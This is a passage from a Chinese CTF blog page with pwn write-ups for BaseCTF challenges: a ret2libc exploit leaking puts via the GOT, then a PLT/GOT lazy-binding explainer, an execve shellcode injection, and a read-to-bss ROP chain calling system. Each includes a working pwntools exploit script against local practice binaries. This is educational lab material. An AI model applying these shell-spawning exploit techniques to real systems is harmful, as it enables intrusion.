class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401176</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="加载二进制文件和动态链接库"><a href="#加载二进制文件和动态链接库" class="headerlink" title="加载二进制文件和动态链接库"></a>加载二进制文件和动态链接库</h2><p><code>libc = ELF(&#39;libc.so.6&#39;)</code>这一段是用来加载动态链接库libc.so.6，用于后续获取libc函数的地址</p>
<p><code>elf = ELF(&#39;./pwn&#39;)</code>用来加载本地的二进制文件，用于获取程序中的地址信息</p>
<h2 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401176</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br></pre></td></tr></table></figure>

<p>这里获取了puts函数在PLT(程序链接表)和GOT(全局偏移表)的地址，后面泄露用</p>
<h2 id="构造payload1"><a href="#构造payload1" class="headerlink" title="构造payload1"></a>构造payload1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>首先溢出覆盖溢出点之前的内存区域，直到返回地址的位置。</p>
<p>接着<code>pop_rdi</code>+<code>puts_GOT</code>，将puts函数在GOT表中的地址弹入rdi。</p>
<p>通过<code>puts_plt</code>调用puts函数，打印出rdi寄存器中此时的值，也就是puts函数在GOT表中的实际位置</p>
<p>泄露完成后，返回main函数，等待下一次payload</p>
<h2 id="获取puts的实际地址，并计算libc基址"><a href="#获取puts的实际地址，并计算libc基址" class="headerlink" title="获取puts的实际地址，并计算libc基址"></a>获取puts的实际地址，并计算libc基址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<ul>
<li><code>u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</code><ul>
<li><code>recvuntil(&#39;\x7f)</code>为接收输出直到遇到第一个<code>\x7f</code>字节，</li>
<li><code>[-6:]</code>为取最后6个字节</li>
<li><code>ljust(8,b&#39;\x00&#39;)</code>为将字节串填充到8个字节</li>
<li><code>u64</code>将字节串转换为64位无符号整数</li>
</ul>
</li>
<li><code>print(hex(puts_addr))</code><ul>
<li>将<code>puts</code>函数的真正地址打印出来（其实不加这一步也没事）</li>
</ul>
</li>
<li><code>libc_base = puts_addr-libc.sym[&#39;puts&#39;]</code><ul>
<li>这里是计算libc库的基地址，因为libc.sym[‘puts’]是<code>puts</code>函数在libc中的偏移地址，所以这样可以得到基地址，为后面构造payload2准备</li>
</ul>
</li>
</ul>
<h2 id="构造payload2，getshell"><a href="#构造payload2，getshell" class="headerlink" title="构造payload2，getshell"></a>构造payload2，getshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>binsh = libc_base+next(libc.search(b&#39;/bin/sh&#39;))</code><ul>
<li><code>libc.search(b&#39;/bin/sh&#39;)</code>为一个生成器，用于在libc库中搜索包含&#x2F;bin&#x2F;sh字符串的所有地址，而<code>b&#39;/bin/sh</code>意为是一个字节串</li>
<li><code>next(libc.search(b&#39;/bin/sh&#39;))</code>即调用next函数获取生成器的下一个值，简单来说，在这里就是从生成器里获取第一个匹配的地址</li>
</ul>
</li>
</ul>
<h2 id="ret2libc原理介绍"><a href="#ret2libc原理介绍" class="headerlink" title="ret2libc原理介绍"></a>ret2libc原理介绍</h2><p>我的理解也不是很深刻，如有错误请多多包涵</p>
<p>参考博客：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#">PLT&amp;GOT</a></p>
<h3 id="PLT表和GOT表"><a href="#PLT表和GOT表" class="headerlink" title="PLT表和GOT表"></a>PLT表和GOT表</h3><p>GOT(Globle offset table)全局偏移量表，位于数据段，是一个每个条目事8字节地址的数组，用来存储外部函数在内存的确切地址</p>
<p>PLT(Procedure linkage table)过程连接表，位于代码段，是一个每个条目事16字节内容的数组，使得代码能够方便的访问共享的函数或者变量</p>
<p>可以一起做一个实验,编写如下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        print_banner();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次执行编译命令：</p>
<p><code>gcc -Wall -g -o test.o -c test.c -m32</code></p>
<p><code>gcc -o test test.o -m32</code></p>
<p>这时我们的测试文件夹中有了test.c、test.o和可执行文件test</p>
<p>通过<code>objdump -d test.o</code>查看反汇编</p>
<p><img src="/image.png" alt="alt text"></p>
<p>可以看到在<code>print_banner</code>中存在<code>7:   e8 fc ff ff ff          call   8 &lt;print_banner+0x8&gt;</code>这样一行</p>
<p>printf()和函数实在glic动态库里面的，只有当程序运行起来的时候才可以确定地址（延迟绑定技术），所以此时的printf（）函数先用fc ff ff ff 也就是有符号的-4来代替</p>
<p>运行时进行重定位时无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢？</p>
<p>链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，进行链接的时候只需要对printf_stub()重定位就可以了</p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>

<p>总之，动态链接每个函数需要两个东西：</p>
<ul>
<li>用来存放外部函数地址的数据段</li>
<li>用来获取数据段记录的外部函数地址的代码</li>
</ul>
<p>这里就出现了我们提及的两个表GOT（存放外部函数地址）和PLT（存放额外代码）</p>
<p><img src="/image-1.png" alt="alt text"></p>
<p>可执行文件里面保存的时PLT表对应的地址，对那个PLT地址指向的是GOT的地址，GOT表指向的就是glibc中的地址</p>
<p>那么我们可以发现，在这里面想要通过plt表获取函数的地址，首先要保证got表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux引入了延迟绑定机制</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会进行地址解析和重定位功能工作，为此可以使用类似这样的代码来实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span></span><br><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    <span class="comment">//调用重定位函数查找 printf 地址，并写到 printf@got</span></span><br><span class="line">    <span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码一开始的时候，printf@got是lookup_printf函数的地址，这个函数的作用是找寻printf()的地址，然后写入printf@got，lookup_printf执行完成后会返回到address_good，这样再jmp的话就可以直接跳到printf来执行了</p>
<p>也就是说，如果不知道printf地址，就去找找;如果知道，那就直接jmp去printf</p>
<p>接下来看一下怎么找的</p>
<p><code>objdump -d test &gt; test.asm</code>,在test.asm中可以看到plt表中的三项指令</p>
<p><img src="/image-2.png" alt="alt text"></p>
<p>可以看到后面两个表项中，plt表的第一条都是直接跳转到对应的got表项，而got表项的内容可以gdb查看</p>
<p><img src="/image-3.png" alt="alt text"></p>
<p><em>发现不太清楚地址怎么计算出来的话可以先了解一下信息存储</em>.</p>
<p>之前说过，在还没有执行函数之前，printf@got的内容是lookup_printf函数的地址，这就是要去找的printf函数的地址了</p>
<p>接下来的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $<span class="number">0x0</span> <span class="comment">//将数据压到栈上，作为要执行的函数的参数</span></span><br><span class="line">jmp    <span class="number">1030</span> &lt;_init+<span class="number">0x30</span>&gt;    <span class="comment">//去到了第一个表项里</span></span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00001030</span> &lt;__libc_start_main@plt<span class="number">-0x10</span>&gt;:</span><br><span class="line">push   <span class="number">0x4</span>(%ebx)    <span class="comment">//将数据压到栈上，作为后面函数的参数</span></span><br><span class="line">jmp    *<span class="number">0x8</span>(%ebx)   <span class="comment">//跳转到函数</span></span><br><span class="line">add    %al,(%eax)</span><br></pre></td></tr></table></figure>

<p>再查找下看看jmp去哪了</p>
<p><img src="/image-4.png" alt="alt text"></p>
<p>对应的函数是<code>_dl_runtime_resolve</code></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>
<p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p>
<p>到这里我们解决最后两个问题;</p>
<ul>
<li>dl_runtime_resolve 是怎么知道要查找 printf 函数的<ul>
<li>在xxx@plt中，我们在jmp之前push了一个参数，每个xxx@plt的push的操作数都不一样，那个参数就相当于函数的id，告诉了_dl_runtime_resolve要去找哪一个函数的地址</li>
<li>在elf文件中.rel.plt保存了重定位表的信息，使用<code>readelf -r test</code>命令可以查看test可执行文件中的重定位信息</li>
</ul>
</li>
<li>_dl_runtime_resolve找到printf函数地址之后，它怎么知道回填到哪个GOT表项<ul>
<li><p>看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：<br>got [0]: 本 ELF 动态段 （.dynamic 段）的装载地址<br>got [1]：本 ELF 的 link_map 数据结构描述符地址<br>got [2]：_dl_runtime_resolve 函数的地址<br>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/4th_shellcode_level0/shellcode_level0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/4th_shellcode_level0/shellcode_level0/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:36:58" itemprop="dateModified" datetime="2025-02-11T16:36:58+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“shellcode-level0”"><a href="#Basectf-pwn方向“shellcode-level0”" class="headerlink" title="Basectf pwn方向“shellcode_level0”"></a>Basectf pwn方向“shellcode_level0”</h1><p>by Maple</p>
<p>题目的提示很明显，就是shellcode，反编译发现直接通过mmap函数输入,权限为7，所以直接注入shellcode就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./shellcode_level0&#x27;</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="asm-shellcraft-sh"><a href="#asm-shellcraft-sh" class="headerlink" title="asm(shellcraft.sh())"></a>asm(shellcraft.sh())</h2><p><code>shellcraft.sh()</code>是一个生成shellcode的函数;<code>asm()</code>函数将shellcode汇编成机器码。</p>
<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p><code>mmap()</code>的函数原型是<code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
<ul>
<li><strong>void addr</strong> 指定内存映射区的起始地址。通常设置为NULL,让系统自动选择合适的地址。如果指定地址，需要确保地址对齐，并且有足够的空间</li>
<li><strong>size_t length</strong>:映射区的长度，以字节为单位</li>
<li><strong>prot</strong>:指定内存区域的保护属性<ul>
<li>PROT_READ：区域可读(0x1)</li>
<li>PROT_WRITE：区域可写(0x2)</li>
<li>PROT_EXEC：区域可执行(0x4)</li>
<li>PROT_NONE；区域不可访问</li>
</ul>
</li>
<li><strong>flags</strong>:指定映射对象的类型和可见性<ul>
<li>MAP_PRIVATE：创建一个写入时复制（copy-on-write）的私有映射。对映射区域的修改不会反映到原始文件中。（0x02）</li>
<li>MAP_SHARED：创建一个共享映射。对映射区域的修改会反映到原始文件中。(0X01)</li>
<li>MAP_ANONYMOUS：创建一个匿名映射，不与任何文件关联（0x20）</li>
</ul>
</li>
<li><strong>fd</strong>: 文件描述符，用于指定要映射的文件。如果使用MAP_ANONYMOUS，则此参数通常设置为-1</li>
<li><strong>offset</strong>：文件中的偏移量，指定从文件的哪个位置开始映射。通常需要是页大小的整数倍</li>
</ul>
<p>这道题的mmap函数调用为<code>buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL)</code></p>
<p>让系统自主选择地址</p>
<p>映射区长度为0x1000uLL（4096字节）</p>
<p>保护属性为7（PROT_READ | PROT_WRITE | PROT_EXEC）：可读可写可执行</p>
<p>flags为34（MAP_PRIVATE | MAP_ANONYMOUS）：创建一个私有的匿名映射</p>
<h2 id="手写shellcode"><a href="#手写shellcode" class="headerlink" title="手写shellcode"></a>手写shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./shellcode_level0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="这里为什么是send而不是sendline"><a href="#这里为什么是send而不是sendline" class="headerlink" title="这里为什么是send而不是sendline"></a>这里为什么是send而不是sendline</h2><p>其实写sendline也没问题，不会影响这个脚本的运行,如果深究的话，我认为是这些原因</p>
<ol>
<li>发送的是shellcode：<code>asm(shellcraft.sh())</code>生成的是机器码（二进制数据），而不是文本命令。shellcode通常不需要换行符来触发执行，因为它本身就是一段可执行的机器指令</li>
<li>精确控制数据：使用send可以确保发送的数据完全是你生成的shellcode，没有任何额外的字符（如换行符）被添加。这可以确保shellcode正确执行。</li>
</ol>
<p><em>注意，有些题目写send或sendline得到的结果是完全不同的，但后面遇到再说吧</em>.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/3st_%E5%BD%BB%E5%BA%95%E5%A4%B1%E5%8E%BB%E4%BB%96/cdsqt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/3st_%E5%BD%BB%E5%BA%95%E5%A4%B1%E5%8E%BB%E4%BB%96/cdsqt/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:36:43" itemprop="dateModified" datetime="2025-02-11T16:36:43+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“彻底失去她”"><a href="#Basectf-pwn方向“彻底失去她”" class="headerlink" title="Basectf pwn方向“彻底失去她”"></a>Basectf pwn方向“彻底失去她”</h1><p>by Maple</p>
<p>和“我把她丢了”比较类似，都是ROP简单构造，但是源码中没有bin&#x2F;sh，需要通过read读取到bss段，再进行调用</p>
<p>需要注意read的三个参数顺序是rdi，rsi，rdx，我们应该依次布置为0，buf,0x10，此时调用read函数就是read(0,buf,0x10)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./cdsqt&quot;)</span><br><span class="line">elf = ELF(&#x27;./cdsqt&#x27;)</span><br><span class="line"></span><br><span class="line">system = elf.plt[&#x27;system&#x27;]</span><br><span class="line">read = elf.plt[&#x27;read&#x27;]</span><br><span class="line">pop_rdi = 0x401196</span><br><span class="line">pop_rsi = 0x4011ad</span><br><span class="line">pop_rdx = 0x401265</span><br><span class="line">bss = 0x4040A0</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0xa+8)</span><br><span class="line">payload+=p64(pop_rdi)+p64(0)</span><br><span class="line">payload+=p64(pop_rsi)+p64(bss)</span><br><span class="line">payload+=p64(pop_rdx)+p64(0x10)</span><br><span class="line">payload+=p64(read)#read(0,buf,0x10)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解释内容；</p>
<h2 id="payload-b’a’-0xa-8"><a href="#payload-b’a’-0xa-8" class="headerlink" title="payload &#x3D; b’a’*(0xa+8)"></a>payload &#x3D; b’a’*(0xa+8)</h2><p>填充字节，用于覆盖返回地址之前的内存空间，使其到达返回地址的位置</p>
<h2 id="payload-p64-pop-rdi-p64-0"><a href="#payload-p64-pop-rdi-p64-0" class="headerlink" title="payload+&#x3D;p64(pop_rdi)+p64(0)"></a>payload+&#x3D;p64(pop_rdi)+p64(0)</h2><p>将0弹入rdi寄存器，因为rdi是read函数的第一个参数，表示文件描述符，0代表标准输入</p>
<h2 id="payload-p64-pop-rsi-p64-bss"><a href="#payload-p64-pop-rsi-p64-bss" class="headerlink" title="payload+&#x3D;p64(pop_rsi)+p64(bss)"></a>payload+&#x3D;p64(pop_rsi)+p64(bss)</h2><p>将bss段的地址弹到rsi寄存器，rsi是read函数的第二个参数，表示读取数据的缓冲区地址</p>
<h2 id="payload-p64-pop-rdx-p64-0x10"><a href="#payload-p64-pop-rdx-p64-0x10" class="headerlink" title="payload+&#x3D;p64(pop_rdx)+p64(0x10)"></a>payload+&#x3D;p64(pop_rdx)+p64(0x10)</h2><p>将0x10弹到rdx寄存器，rdx是read函数的第三个参数，表示读取的字节数</p>
<h2 id="payload-p64-read"><a href="#payload-p64-read" class="headerlink" title="payload+&#x3D;p64(read)"></a>payload+&#x3D;p64(read)</h2><p>调用read函数，这个时候read函数被构造为了<code>read(0,bss,0x10)</code>,即从标准输入读取0x10个字节的数据到bss段</p>
<h2 id="payload-p64-pop-rdi-p64-bss-p64-system"><a href="#payload-p64-pop-rdi-p64-bss-p64-system" class="headerlink" title="payload+&#x3D;p64(pop_rdi)+p64(bss)+p64(system)"></a>payload+&#x3D;p64(pop_rdi)+p64(bss)+p64(system)</h2><p>将bss段的地址弹到rdi寄存器，作为system函数的参数，然后调用system</p>
<h2 id="这里为什么没有ret了"><a href="#这里为什么没有ret了" class="headerlink" title="这里为什么没有ret了"></a>这里为什么没有ret了</h2><p>建议自己搜索学习一下</p>
<p>提示bss段地址为<code>0x4040A0</code>,而“我把她丢了”的字符串bin&#x2F;sh的地址为<code>0x402008</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Maple</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
